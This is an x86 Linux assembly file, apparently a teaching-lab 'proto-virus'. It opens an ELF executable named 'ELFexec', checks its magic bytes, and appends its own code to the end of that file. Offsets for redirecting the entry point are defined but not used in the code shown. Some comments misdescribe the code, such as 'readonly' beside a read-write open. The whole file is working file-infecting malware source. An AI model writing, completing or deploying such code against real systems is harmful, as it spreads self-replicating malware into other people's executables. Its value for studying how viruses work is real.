
%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filedxze	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	open FileName, 2, 0777 		; open FileName with readonly and 111 permissions  (read)
	mov esi, eax				; save fd in edx
	cmp esi, 0
	jl _print_failure
	read esi, esp, 4			; read first 4 bytes into esp (reserved place)
	cmp dword [esp], 0x464c457f ;cmp STK_RES to elf magic bytes
	jne _print_failure
	;now we should write the code from _start to virus_end
	call get_my_loc				;now ecx holds location for next_i
	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
	push ecx
	lseek esi, 0, SEEK_END		;jump with the ELF file descriptor to it's end
	pop ecx
	write esi, ecx, virus_end-_start
	close esi
	jmp VirusExit
	
	_print_failure:
		write 1, Failstr, 13 


VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


